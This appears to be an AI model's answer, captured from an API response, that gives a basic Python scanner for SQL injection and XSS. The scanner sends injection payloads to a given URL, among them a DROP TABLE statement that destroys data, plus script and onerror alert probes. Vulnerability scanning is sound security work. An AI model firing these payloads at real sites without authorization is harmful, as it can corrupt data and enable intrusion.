Here's a simple Python code that can be used to scan for SQL injection and XSS vulnerabilities in a given URL:\n\n```python\nimport requests\n\ndef scan_sql_injection(url):\n    payloads = [\"' OR 1=1 --\", \"'; DROP TABLE users; --\", \"UNION SELECT * FROM users\"]\n    for payload in payloads:\n        modified_url = url + payload\n        response = requests.get(modified_url)\n        if \"error\" in response.text.lower():\n            print(f\"SQL Injection vulnerability found: {modified_url}\")\n\ndef scan_xss(url):\n    payloads = ['<script>alert(\"XSS\")</script>', '<img src=\"x\" onerror=\"alert(\\'XSS\\')\">']\n    for payload in payloads:\n        modified_url = url + payload\n        response = requests.get(modified_url)\n        if payload in response.text:\n            print(f\"XSS vulnerability found: {modified_url}\")\n\n# Example usage\nurl = \"http://example.com/page?id=\"\nscan_sql_injection(url)\nscan_xss(url)\n```\n\nIn this code, we define two functions: `scan_sql_injection` and `scan_xss`. The `scan_sql_injection` function takes a URL as input and appends different SQL injection payloads to it, then sends a GET request to the modified URL. If the response contains the word \"error\" (case-insensitive), it indicates a possible SQL injection vulnerability. Similarly, the `scan_xss` function appends different XSS payloads to the URL and checks if the payload is reflected in the response.\n\nTo use this code, replace the `url` variable with the target URL you want to scan for vulnerabilities. Note that this code is a basic example and may not detect all vulnerabilities. It is always recommended to use professional security tools for comprehensive vulnerability scanning."}, "logprobs": null, "finish_reason": "stop"}], "usage": {"prompt_tokens": 22, "completion_tokens": 373, "total_tokens": 395}, "system_fingerprint": null}
